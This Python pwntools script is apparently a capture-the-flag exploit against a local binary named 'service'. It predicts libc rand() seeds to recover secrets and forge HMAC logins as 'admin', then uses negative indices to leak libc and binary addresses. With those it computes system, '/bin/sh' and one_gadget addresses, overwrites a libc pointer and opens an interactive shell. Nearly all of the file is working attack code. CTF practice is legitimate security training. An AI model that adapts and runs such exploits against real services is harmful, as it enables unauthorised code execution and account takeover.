from pwn import *
import hmac
from ctypes import CDLL

p = process("./service")

libc = CDLL("libc.so.6")


def genString(length):
	data=[0]*length
	print_data="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	for i in range(0,length):
		data[i]=print_data[libc.rand()%52]
	return "".join(data)
def getSecret(data):
	list_data=[]
	for i in range(0,100000):
		libc.srand(i)
		uid=genString(10)
		public_key=genString(16)
		challenge=genString(16)
		secret=genString(16)
		s=0
		for j in range(0,len(data)):
			if public_key[j]==data[j]:
				s+=1
		if s>15:
			list_data.append(uid)
			list_data.append(public_key)
			list_data.append(challenge)
			list_data.append(secret)
	return list_data



def signup(username,pwd):
	p.sendline("1")
	p.sendline(username)
	p.sendline(pwd)

def signin(username,password):
	list_data=[]
	p.sendline("2")
	p.sendline(username)
	p.recvuntil("Publickey: ")
	public_key=p.recvuntil("\n").strip()
	print "public key =", public_key
	p.recvuntil("Challenge: ")
	challenge= p.recvuntil("\n").strip()
	print "challenge: ", challenge
	h4=hmac.new(public_key,password + challenge).hexdigest().upper()
	print "hmac =",h4
	p.sendline(h4)
	list_data.append(public_key)
	list_data.append(challenge)
	list_data.append(h4)
	return list_data
def signin1(username):
	list_data=[]
	p.sendline("2")
	p.sendline(username)
	p.recvuntil("Publickey: ")
	public_key=p.recvuntil("\n").strip()
	print "public key =", public_key
	p.recvuntil("Challenge: ")
	challenge= p.recvuntil("\n").strip()
	print "challenge: ", challenge
	list_data.append(public_key)
	return list_data
def secret(key):
	p.sendline("4")
	print "session len = ",len(session.strip())
	p.sendline(session.strip())
	h5 = hmac.new(list_data[2],list_data[1]+"secret").hexdigest().upper()
	print h5
	p.sendline(h5)
	secret_data=getSecret(public_key)
	print "secret",secret_data[3]
	p.sendline(secret_data[3])
def management(public_key):
	list_data =[]
	p.sendline("5")
	secret_data=getSecret(public_key)
	print secret_data[0]
	p.sendline(secret_data[0])
	h6=hmac.new("",secret_data[2]+"management").hexdigest().upper()
	p.sendline(h6)
	p.sendline("2")
	p.sendline("-8")
	p.sendline("b"*64)
	# p.sendline("b")
	p.sendline("3")
	print "smt here",p.recv()
	print "\n"
	p.sendline("-8")
	leak_libc = u64(p.recv()[74:80].strip().ljust(8,"\x00"))
	p.sendline("3")
	p.sendline("-11")
	p.recvuntil("Username: ")
	leak_bin= u64(p.recvuntil("\n").strip().ljust(8,"\x00"))
	list_data.append(leak_libc)
	list_data.append(leak_bin)

	return list_data

fake_signin=signin1("admin")
get_public_key=fake_signin[0]
p.close()

env={'LD_PRELOAD': './libc-2.31.so'}

p=process("./service",env=env)
elf = ELF('./service')
libc1=ELF('./libc-2.31.so')

leaked=management(get_public_key)
print "leak libc = ",hex(leaked[0])
print "leak bin_addr_dso_handle = ",hex(leaked[1])
libc_base=leaked[0]-0x1eba04
print "libc_base = ",hex(libc_base)
sys_addr =libc_base+libc1.symbols['system']
print hex(libc1.symbols['system'])
print "sys_addr = ",hex(sys_addr)
binsh_addr=libc_base+libc1.search('/bin/sh').next()
print "binsh_addr = ",hex(binsh_addr)
one_gadget=libc_base+0xe6e76
print "one_gadget = ",hex(one_gadget)

gdb.attach(p,'''b *releaseuser
	c''')

p.sendline("2")
p.sendline("-11")
# p.sendline(p64(leaked[1]))
p.sendline(p64(libc_base+0x00000000001eeb28-0x20))
p.sendline(p64(one_gadget))
p.sendline("4")

p.sendline("6")




p.interactive()

